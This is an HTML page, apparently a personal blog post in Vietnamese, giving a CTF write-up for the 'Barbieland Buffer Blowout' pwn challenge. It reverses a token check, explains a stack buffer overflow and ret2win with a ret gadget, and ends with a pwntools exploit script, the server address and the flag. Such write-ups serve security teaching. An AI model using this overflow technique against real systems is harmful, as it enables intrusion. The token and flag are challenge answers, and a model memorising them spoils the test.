@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Barbieland Buffer Blowout - Writeup — Nguyen Thai Ngoc</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+  <header class="topbar"><div class="wrap topbar-inner"><a class="brand" href="/">ThaiNgoc :~$</a><nav class="nav"><a href="/">Home</a><a class="active" href="/writeups/">Writeups</a><a href="/projects/">Projects</a><a href="/achievements/">Achievements</a><a href="/contact/">Contact</a></nav></div></header>
+  <main class="page">
+    <div class="wrap article-layout">
+      <aside class="toc">
+        <div class="toc-title">On this page</div>
+        <a href="#overview">Overview</a>
+        <a href="#initial">Initial Analysis</a>
+        <a href="#protections">Protections</a>
+        <a href="#analysis">Code Analysis</a>
+        <a href="#vulnerability">Vulnerability</a>
+        <a href="#exploit">Exploitation</a>
+      </aside>
+      <article class="article-card glass">
+        <div class="eyebrow">CTF Writeup · Binary Exploitation</div>
+        <h1 class="page-title">Barbieland Buffer Blowout</h1>
+        <p class="lead">A glamorous Barbieland relay kiosk still accepts calibration input before unlocking its backstage tools. Work the console correctly and recover the final pink protocol message.</p>
+        
+        <div class="info-card">
+          <div class="item"><div class="label">Category</div><div class="value accent">Binary Exploitation / Pwn</div></div>
+          <div class="item"><div class="label">Difficulty</div><div class="value">Medium</div></div>
+          <div class="item"><div class="label">File</div><div class="value">barbie_core.b64</div></div>
+        </div>
+
+        <h2 id="overview">Overview</h2>
+        <p>Đây là bài binary exploitation tức là ta phải phân tích file chương trình, tìm lỗ hổng trong code, rồi gửi input đặc biệt lên server để lấy flag.</p>
+
+        <h2 id="initial">Initial Analysis</h2>
+        <p>File đề bài cho đang ở định dạng base64, do đó bước đầu tiên là cần decode để khôi phục lại file thực thi binary gốc, sau đó kiểm tra thông tin cơ bản của file.</p>
+        <p>Đây là file thực thi Linux 64-bit, not stripped nghĩa là còn tên hàm, rất thuận lợi cho phân tích.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image1.png" alt="File type check" />
+
+        <p>Sau đó tôi dùng lệnh <code>objdump -d barbie_core</code>. Lướt thì thấy hàm này nghe tên thôi là biết có lỗ hổng nên tôi sẽ chỉ lọc các hàm để xem: <code>objdump -d barbie_core | grep "&gt;:"</code></p>
+        <img src="/assets/media/writeups/pwn/barbieland/image2.png" alt="objdump output" />
+
+        <ul>
+            <li><strong>main:</strong> là hàm khởi chạy chính. Nó chịu trách nhiệm gọi các hàm đó theo thứ tự.</li>
+            <li><strong>Check_token:</strong> Hàm này phù hợp với manh mối calibration input mà ta đọc ở mô tả. Nếu nhập sai token thì nó sẽ nhảy ra ngoài, còn nếu nhập đúng thì nó sẽ cho đi tiếp.</li>
+            <li><strong>vulnerable_prompt:</strong> nghe tên đã biết đây là chỗ có lỗ hổng.</li>
+            <li><strong>win:</strong> là mục tiêu của bài này.</li>
+        </ul>
+        <img src="/assets/media/writeups/pwn/barbieland/image3.png" alt="Functions list" />
+
+        <h2 id="protections">Kiểm tra các cơ chế bảo vệ</h2>
+        <p>Mình sử dụng công cụ readelf (hoặc checksec) để xem xét các quyền phân vùng bộ nhớ của chương trình:</p>
+        <p>Nhìn dòng đầu tiên thấy PIE bị tắt, vậy địa chỉ hàm win cố định 0x4013c3, không thay đổi ở mỗi lần chạy. Stack là RW, NX bật nên không chạy shellcode trên stack được.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image4.png" alt="Checksec / readelf" />
+
+        <p>Kiểm tra Canary: Không có Stack Canary.</p>
+        <p>Đang là Partial RELRO, về lý thuyết mình có thể dùng kỹ thuật GOT Overwrite nhưng Canary đang không có nên tôi sẽ dùng kỹ thuật Ret2Win để làm tràn buffer để ghi đè dữ liệu trả về bằng địa chỉ hàm win.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image5.png" alt="Canary check" />
+
+        <h2 id="analysis">Phân tích hàm main</h2>
+        <p>Chương trình sử dụng hàm <code>fgets(local_48, 0x40, stdin)</code>. Nó chỉ đọc đúng 64 bytes (0x40) vào một bộ đệm có kích thước vừa vặn 64 bytes. Nên không thể thực hiện Buffer Overflow tại đây.</p>
+        <p>Đoạn code C này khớp hoàn toàn với kịch bản mình đã dự đoán từ đầu. Để đến được hàm <code>vulnerable_prompt</code>, chúng ta bắt buộc phải nhập đúng chuỗi token dài 16 byte để hàm <code>check_token()</code> trả về kết quả khác 0 (True).</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image6.png" alt="Decompiled main" />
+
+        <h3>Phân tích hàm Check_token</h3>
+        <p>Đọc mã giả C, ta thấy chương trình khởi tạo biến trạng thái ban đầu <code>state = 0x42</code> (ký tự B), sau đó chạy vòng lặp i từ 0 đến 15 để xử lý từng ký tự của input. Tại mỗi vòng lặp, state được xoay vòng bit sang trái bằng hàm <code>rol8(state, i % 5)</code>. Tiếp theo, chương trình tạo một khóa phụ bằng công thức dịch bit <code>(i &lt;&lt; 3) - i</code> (là i * 8 - i = i * 7) rồi cộng với 0x5a. Nó lấy khóa phụ này đi XOR với ký tự input hiện tại <code>input[i]</code>, rồi cộng với state đã được xoay ở trên để tạo ra giá trị mới. Giá trị này sau đó được đem so sánh với mảng tĩnh target.0.</p>
+        <p>Nhìn dòng cuối thấy <code>state = bVar2 XOR state * 33</code>.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image7.png" alt="Check_token decompiled" />
+
+        <p>Mục tiêu của ta giờ là phải tìm target.0. Tìm thấy 16 bytes mà ta cần khớp vào <code>0x5a,0x6,0xb5,0x86,0x17,0x8,0x8e,0xba,0xd6,0xd4,0xd7,0x6,0xb7,0x96,0x38,0xae</code>. Giờ đã có công thức trong hàm check_token và mảng target.0 nên ta chỉ cần đảo ngược target này lại thì sẽ ra input chính là token mà ta nhập vào.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image8.png" alt="Target array" />
+
+        <p>Giờ chúng ta đã có token là: <code>B4RB13-C0R3GL4M!</code></p>
+        <img src="/assets/media/writeups/pwn/barbieland/image9.png" alt="Token generation" />
+
+        <h2 id="vulnerability">Chi tiết lỗ hổng</h2>
+        <p>Sau khi bypass thành công cơ chế kiểm tra token ở hàm main, luồng thực thi của chương trình được chuyển hướng vào hàm <code>vulnerable_prompt()</code>.</p>
+        <p>Chương trình cấp phát một mảng ký tự <code>local_48</code> có kích thước cố định là 64 bytes. Tuy nhiên, hàm <code>read(0, local_48, 0x100)</code> lại cho phép nhập tối đa 0x100 bytes (256 bytes). Việc không kiểm tra giới hạn đầu vào cho phép kẻ tấn công nhập dữ liệu vượt quá sức chứa của local_48, làm tràn dữ liệu sang các vùng nhớ lân cận trên Stack.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image10.png" alt="vulnerable_prompt" />
+        
+        <p>Sự chênh lệch này cho phép ghi đè dữ liệu tràn ra khỏi giới hạn của bộ đệm, xâm phạm đến các vùng nhớ quan trọng liền kề trên Stack frame. Do không có Stack Canary, việc ghi đè sẽ diễn ra trót lọt mà không bị chương trình phát hiện. Do đây là môi trường 64-bit, nên thanh ghi RBP có kích thước là 8 bytes.</p>
+        <p>Hành trình ghi đè dữ liệu sẽ diễn ra từ địa chỉ thấp đến cao. Dữ liệu rác trước tiên sẽ lấp đầy 64 bytes của vùng đệm. Để tiếp cận được Return Address, payload bắt buộc phải tràn qua và ghi đè hoàn toàn 8 bytes của RBP.</p>
+        <p><strong>=&gt; Cần 72 bytes rác để ghi đè Return Address</strong></p>
+
+        <h2 id="exploit">Exploitation</h2>
+        <p>Hàm <code>win</code> ở địa chỉ 0x4013c3, nó mở file flag và in ra. Ta cần nhảy vào đây.</p>
+        <p>Nhảy trực tiếp vào hàm win() gây ra tình trạng lệch Stack 8 bytes, vi phạm quy ước gọi hàm System V ABI (yêu cầu Stack phải căn chỉnh 16 byte trước khi thực thi). Điều này dẫn đến lỗi Segmentation Fault khi hàm thư viện bên trong win() gọi lệnh movaps. Để khắc phục, ta sử dụng một ret gadget làm bước đệm trong ROP chain. Lệnh ret này sẽ trượt Stack đi 8 byte, khôi phục lại sự căn chỉnh 16 byte hoàn hảo trước khi nhảy vào win().</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image11.png" alt="Stack alignment issue" />
+
+        <p>Ta có thể sử dụng bất kỳ địa chỉ nào trong danh sách ret gadget vì chúng đều nằm trong vùng nhớ có quyền thực thi. Mình sẽ chọn địa chỉ <code>0x4011e4</code> để làm ret gadget chèn vào Payload.</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image12.png" alt="Ret gadget" />
+
+        <p>Chốt lại cấu trúc:</p>
+        <ul>
+            <li><code>Payload = [72 bytes rác để lấp đệm và Saved RBP] + [Địa chỉ Ret Gadget] + [Địa chỉ hàm win()]</code></li>
+            <li>Cụ thể: <code>Payload = b'A' * 72 + b'\xe4\x11\x40\x00\x00\x00\x00\x00' + b'\xc3\x13\x40\x00\x00\x00\x00\x00'</code></li>
+        </ul>
+        <p>Thay vì tự làm rất dễ sai, ta sử dụng hàm <code>struct.pack('&lt;Q', addr)</code> trong Python. Ký tự <code>&lt;</code> ép kiểu dữ liệu về Little-Endian, và <code>Q</code> đảm bảo kích thước chuỗi trả về luôn là 8 bytes.</p>
+
+        <h3>Script exploit:</h3>
+        <pre><code class="language-python">from pwn import *
+import struct
+
+HOST = '167.99.63.146'
+PORT = 5000
+
+TOKEN = b"B4RB13-C0R3GL4M!"
+WIN_ADDR   = 0x4013c3
+RET_GADGET = 0x4011e4
+
+PADDING = b'A' * 72
+PAYLOAD = PADDING + struct.pack('&lt;Q', RET_GADGET) + struct.pack('&lt;Q', WIN_ADDR)
+
+r = remote(HOST, PORT)
+banner = r.recvuntil(b'code> ')
+r.sendline(TOKEN)
+r.send(PAYLOAD)
+result = r.recvall()
+print(result.decode(errors='replace'))
+r.close()</code></pre>
+
+        <p>Thực thi mã khai thác và chúng ta thu được flag!</p>
+        <img src="/assets/media/writeups/pwn/barbieland/image13.png" alt="Flag" />
+        <div class="note-box">
+            <strong>Flag:</strong> <code>bitctf{{b4rb13_buff3r_b10w0u7}}</code>
+        </div>
+
+        <div class="footer-nav">
+          <a href="/writeups/">← Back to Writeups</a>
+          <a href="/">Home ↑</a>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
